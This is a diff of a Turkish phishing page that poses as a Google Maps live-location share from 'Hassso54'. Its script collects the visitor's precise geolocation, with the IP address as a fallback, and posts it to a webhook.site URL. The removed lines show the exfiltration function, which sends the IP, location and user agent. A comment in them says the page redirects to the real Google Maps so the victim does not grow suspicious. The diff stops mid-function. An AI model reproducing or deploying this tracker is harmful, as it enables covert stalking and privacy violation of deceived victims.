@@ -3,30 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canlı Konum Takibi</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #2c2c2c; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        .icon { font-size: 50px; margin-bottom: 20px; }
-        h2 { margin-bottom: 10px; font-size: 18px; }
-        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
-        button { background-color: #007bff; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
-        button:hover { background-color: #0056b3; }
-        #loading { display: none; margin-top: 15px; font-style: italic; color: #ffc107; }
+    <title>Google Haritalar - Konum Paylaşımı</title> <style>
+        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; color: #3c4043; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(60,64,67,0.3); width: 90%; max-width: 380px; border: 1px solid #dadce0; }
+        .google-logo { width: 74px; margin-bottom: 20px; }
+        h2 { margin-bottom: 15px; font-size: 20px; font-weight: 400; color: #202124; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; transition: background 0.2s; }
+        button:hover { background-color: #1765cc; box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15); }
+        #loading { display: none; margin-top: 15px; font-size: 12px; color: #1a73e8; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">📍</div>
-    <h2>Canlı Konum Paylaşımı</h2>
-    <p><b>Hassso54</b> sizinle canlı konumunu paylaştı. Haritada görüntülemek için aşağıdaki butona tıklayın.</p>
-    <button onclick="konumuAl()">Hassso54 Konumunu Gör</button>
-    <div id="loading">Bağlantı kuruluyor, lütfen bekleyin...</div>
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+    <h2>Konum görüntüleme isteği</h2>
+    <p><b>Hassso54</b> sizinle gerçek zamanlı konumunu paylaştı. Haritaya bağlanmak ve konumu canlı takip etmek için devam edin.</p>
+    <button onclick="konumuAl()">Konumu Haritada Aç</button>
+    <div id="loading">Google Haritalar'a bağlanılıyor...</div>
 </div>
 
 <script>
-    // KENDİ WEBHOOK LİNKİNİ BURAYA YAPIŞTIR
+    // SENİN WEBHOOK LİNKİN (Bunu değiştirmeyi unutma)
     const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
     function konumuAl() {
@@ -41,8 +40,7 @@
                     veriyiGonder(haritaLink);
                 },
                 (err) => {
-                    // İzin vermezse en azından IP'yi gönder
-                    veriyiGonder("Kullanıcı İzin Vermedi (Sadece IP)");
+                    veriyiGonder("İzin Reddedildi (Sadece IP)");
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
             );
@@ -51,29 +49,4 @@
         }
     }
 
-    function veriyiGonder(konumMesaji) {
-        // IP Adresini çekip her şeyi Webhook'a yolla
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        hedef_kisi: "Hassso54 Takibi",
-                        ip: data.ip,
-                        konum_bilgisi: konumMesaji,
-                        cihaz: navigator.userAgent
-                    })
-                }).then(() => {
-                    // İşlem bitince şüphe çekmemek için gerçek bir haritaya yönlendir
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com/maps";
-                    }, 1500);
-                });
-            });
-    }
-</script>
-
-</body>
-</html>
+    function veriyiGonder(konum
